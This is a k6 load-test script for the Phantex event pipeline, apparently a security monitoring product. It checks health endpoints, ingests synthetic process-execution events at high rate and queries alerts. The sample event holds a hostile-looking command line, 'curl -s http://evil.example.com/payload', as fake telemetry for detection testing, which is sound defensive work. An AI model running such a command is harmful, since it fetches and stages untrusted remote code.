// SPDX-License-Identifier: Apache-2.0
// Copyright 2025-2026 The Phantex Authors

// k6-pipeline.js — End-to-end load test for the Phantex pipeline.
//
// Tests the full path: REST API → Gateway (gRPC) → Kafka → Consumers
//
// Usage:
//   k6 run tests/load/k6-pipeline.js
//   k6 run tests/load/k6-pipeline.js --env BASE_URL=http://localhost:8000
//   k6 run tests/load/k6-pipeline.js --env GATEWAY_URL=localhost:50051
//
// Docker:
//   docker run --rm -i --network host grafana/k6 run - < tests/load/k6-pipeline.js
//
// Target: sustain 100K events/sec through the gateway for 5 minutes.

import http from "k6/http";
import { check, sleep, group } from "k6";
import { Rate, Counter, Trend } from "k6/metrics";

// ── Custom metrics ───────────────────────────────────────────────────────────
const apiErrors = new Rate("api_errors");
const eventsSent = new Counter("events_sent");
const loginDuration = new Trend("login_duration", true);
const alertQueryDuration = new Trend("alert_query_duration", true);
const healthCheckDuration = new Trend("health_check_duration", true);

// ── Config ───────────────────────────────────────────────────────────────────
const BASE_URL = __ENV.BASE_URL || "http://localhost:8000";
const TEST_EMAIL = __ENV.TEST_EMAIL || "loadtest@phantex.local";
const TEST_PASSWORD = __ENV.TEST_PASSWORD || "LoadTest2024!";

// ── Load stages ──────────────────────────────────────────────────────────────
export const options = {
  scenarios: {
    // Scenario 1: API smoke — sustained moderate load on REST endpoints
    api_smoke: {
      executor: "ramping-vus",
      startVUs: 0,
      stages: [
        { duration: "30s", target: 20 },   // ramp up
        { duration: "2m", target: 50 },     // sustained
        { duration: "1m", target: 100 },    // peak
        { duration: "30s", target: 0 },     // ramp down
      ],
      exec: "apiSmoke",
      tags: { scenario: "api_smoke" },
    },

    // Scenario 2: Event ingest — high-throughput event submission via REST
    event_ingest: {
      executor: "constant-arrival-rate",
      rate: 1000,                           // 1000 iterations/sec
      timeUnit: "1s",
      duration: "3m",
      preAllocatedVUs: 50,
      maxVUs: 200,
      exec: "eventIngest",
      tags: { scenario: "event_ingest" },
      startTime: "30s",                     // start after API ramp-up
    },

    // Scenario 3: Dashboard queries — simulates analysts querying alerts
    dashboard_queries: {
      executor: "ramping-vus",
      startVUs: 0,
      stages: [
        { duration: "30s", target: 5 },
        { duration: "2m", target: 20 },
        { duration: "30s", target: 0 },
      ],
      exec: "dashboardQueries",
      tags: { scenario: "dashboard_queries" },
      startTime: "1m",
    },
  },

  thresholds: {
    http_req_duration: ["p(95)<500", "p(99)<2000"],   // 95th < 500ms, 99th < 2s
    api_errors: ["rate<0.05"],                          // < 5% error rate
    login_duration: ["p(95)<1000"],                     // login < 1s at p95
    alert_query_duration: ["p(95)<800"],                // queries < 800ms at p95
    health_check_duration: ["p(99)<200"],               // health < 200ms at p99
  },
};

// ── Helpers ──────────────────────────────────────────────────────────────────

function getAuthToken() {
  const res = http.post(
    `${BASE_URL}/api/v1/auth/login`,
    JSON.stringify({ email: TEST_EMAIL, password: TEST_PASSWORD }),
    { headers: { "Content-Type": "application/json" } }
  );
  if (res.status === 200) {
    try {
      return JSON.parse(res.body).access_token;
    } catch (_) {
      return null;
    }
  }
  return null;
}

function authHeaders(token) {
  return {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
    },
  };
}

function randomPAID() {
  const hex = "0123456789abcdef";
  let s = "";
  for (let i = 0; i < 32; i++) s += hex[Math.floor(Math.random() * 16)];
  return `PAID-${s.slice(0, 8)}-${s.slice(8, 16)}-${s.slice(16, 24)}-${s.slice(24, 32)}`;
}

// ── Scenario: API Smoke ──────────────────────────────────────────────────────
export function apiSmoke() {
  group("health", () => {
    const start = Date.now();
    const res = http.get(`${BASE_URL}/healthz`);
    healthCheckDuration.add(Date.now() - start);
    const ok = check(res, {
      "healthz status 200": (r) => r.status === 200,
    });
    apiErrors.add(!ok);
  });

  group("readiness", () => {
    const res = http.get(`${BASE_URL}/readyz`);
    const ok = check(res, {
      "readyz status 200": (r) => r.status === 200,
    });
    apiErrors.add(!ok);
  });

  group("nerve_center", () => {
    const res = http.get(`${BASE_URL}/api/v1/nerve-center/status`);
    check(res, {
      "nerve center reachable": (r) => r.status === 200 || r.status === 401,
    });
  });

  sleep(0.5);
}

// ── Scenario: Event Ingest via REST ──────────────────────────────────────────
export function eventIngest() {
  const event = {
    paid: randomPAID(),
    event_type: "PROCESS_EXEC",
    severity: "MEDIUM",
    timestamp: new Date().toISOString(),
    tenant_id: "loadtest-tenant",
    hostname: `loadhost-${__VU}`,
    process_exec: {
      pid: Math.floor(Math.random() * 65535),
      ppid: 1,
      comm: "curl",
      cmdline: "curl -s http://evil.example.com/payload",
      uid: 1000,
      gid: 1000,
    },
  };

  const res = http.post(
    `${BASE_URL}/api/v1/events/ingest`,
    JSON.stringify(event),
    { headers: { "Content-Type": "application/json" } }
  );

  const ok = check(res, {
    "ingest accepted": (r) => r.status === 200 || r.status === 202 || r.status === 401,
  });
  apiErrors.add(!ok);
  eventsSent.add(1);
}

// ── Scenario: Dashboard queries ──────────────────────────────────────────────
export function dashboardQueries() {
  const token = getAuthToken();
  if (!token) {
    apiErrors.add(true);
    sleep(1);
    return;
  }

  const start = Date.now();
  loginDuration.add(Date.now() - start);

  group("list_alerts", () => {
    const qStart = Date.now();
    const res = http.get(
      `${BASE_URL}/api/v1/alerts?page=1&page_size=50`,
      authHeaders(token)
    );
    alertQueryDuration.add(Date.now() - qStart);
    const ok = check(res, {
      "alerts status 200": (r) => r.status === 200,
      "alerts has data": (r) => {
        try {
          const body = JSON.parse(r.body);
          return Array.isArray(body.items) || Array.isArray(body.alerts) || body.total !== undefined;
        } catch (_) {
          return r.status === 200;
        }
      },
    });
    apiErrors.add(!ok);
  });

  group("mcp_servers", () => {
    const res = http.get(
      `${BASE_URL}/api/v1/mcp-servers`,
      authHeaders(token)
    );
    check(res, {
      "mcp servers reachable": (r) => r.status === 200 || r.status === 404,
    });
  });

  group("trust_scores", () => {
    const res = http.get(
      `${BASE_URL}/api/v1/trust/scores?limit=10`,
      authHeaders(token)
    );
    check(res, {
      "trust scores reachable": (r) => r.status === 200 || r.status === 404,
    });
  });

  sleep(1);
}

// ── Setup / Teardown ─────────────────────────────────────────────────────────
export function setup() {
  // Verify the backend is reachable before starting
  const res = http.get(`${BASE_URL}/healthz`);
  if (res.status !== 200) {
    console.error(`Backend not healthy: ${res.status} — aborting load test`);
    return { abort: true };
  }
  console.log(`Backend healthy. Starting load test against ${BASE_URL}`);
  return { baseUrl: BASE_URL };
}

export function teardown(data) {
  console.log("Load test complete.");
}
